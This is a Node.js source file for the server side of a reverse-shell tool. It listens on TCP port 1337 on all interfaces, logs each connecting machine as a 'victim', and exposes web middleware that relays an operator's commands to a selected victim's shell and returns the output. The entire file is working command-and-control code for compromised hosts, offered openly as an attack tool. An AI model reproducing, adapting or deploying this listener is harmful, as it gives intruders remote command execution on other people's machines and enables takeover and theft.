var net = require('net');

var tcpPort = 1337;
var victims = [];

// Function passed as parameter is executed for every new connection
net.createServer(function(sock) {
    console.log('Victim %s:%d connected', sock.remoteAddress, sock.remotePort);

    sock.commandLine = '';
    sock.previousCommandLine = '';
    sock.timesUnchanged = 0;

    // Event listener for receiving data
    sock.on('data', function(data){
        this.commandLine += data;
        console.log('Victim %s:%d responded:\n%s', this.remoteAddress, this.remotePort, data);
    })
    // Event listeners for end of connection
    sock.on('close', function() {
        victims.splice(victims.indexOf(this), 1);
        console.log('Victim %s:%d disconnected', this.remoteAddress, this.remotePort, );
    });
    sock.on('error', function (err){
        victims.splice(victims.indexOf(this), 1);
        console.log('Victim %s:%d disconnected because of error: %s', this.remoteAddress, this.remotePort, err.message);  
    });

    victims.push(sock);
}).listen(tcpPort, '0.0.0.0');

// Wrapper for waiting for the first response
function waitForResponse(victim) {
    // Promise to resolve in the future
    return new Promise((resolve) => {
        victim.once('data', function(data) {
            resolve(true);
        });
        victim.once('close', function() {
            resolve(false);
        });
        victim.once('error', function (err) {
            resolve(false);
        });
    });
}

function getVictim(ip, port){
    let i = 0;

    if (ip && port){
        while (i < victims.length){
            if (victims[i].remoteAddress === ip && victims[i].remotePort == port){
                return victims[i];
            }
            i++;
        }
    }

    return undefined;
}

module.exports = {
    getVictims(req, res, next){
        req.victims = victims;
        next();
    },

    // Send command and waits for response (async so whole server doesn't freeze when waiting for the first response)
    //     ip -> req.params.ip
    //     command -> req.body.command
    async send(req, res, next){
        let victim = getVictim(req.params.ip, req.params.port);

        if (!victim){
            return res.redirect(303, '/');
        }
        victim.timesUnchanged = 0;
        victim.commandLine += ' > ' + req.body.command + '\n';
        victim.write(req.body.command + '\n');
        console.log("User sent command: %s", req.body.command);
        await waitForResponse(victim);
        victim.end = false;

        req.victim = victim;
        next();
    },

    getCommandLine(req, res, next){
        let victim = getVictim(req.params.ip, req.params.port);

        if (!victim){
            return res.redirect(303, '/');
        }
        // If there is nothing new to display on commandLine, increment timesUnchanged, 
        // else, reset the counter and reload the page (end = false). When the commandLine hasn't 
        // been changed 5 times, stop reloading the page (end = true)
        // This is done to get the largest number of responses when shell splits one response in many ones 
        // (ie. PowerShell)
        if (victim.previousCommandLine == victim.commandLine){
            victim.timesUnchanged++;
        }
        else{
            victim.timesUnchanged = 0;
            victim.previousCommandLine = victim.commandLine;
        }
        if (victim.timesUnchanged > 5){
            victim.end = true;
        }
        else{
            victim.end = false;
        }

        req.victim = victim;
        next();
    },

    clearCommandLine(req, res, next){
        let victim = getVictim(req.params.ip, req.params.port);

        if (!victim){
            return res.redirect(303, '/');
        }
        victim.commandLine = '';

        next();
    },

    disconnect(req, res, next){
        let victim = getVictim(req.params.ip, req.params.port);

        if (!victim){
            return res.redirect(303, '/');
        }
        victim.destroy();
        console.log("Connection with %s:%d ended", victim.remoteAddress, victim.remotePort);

        next();
    }
}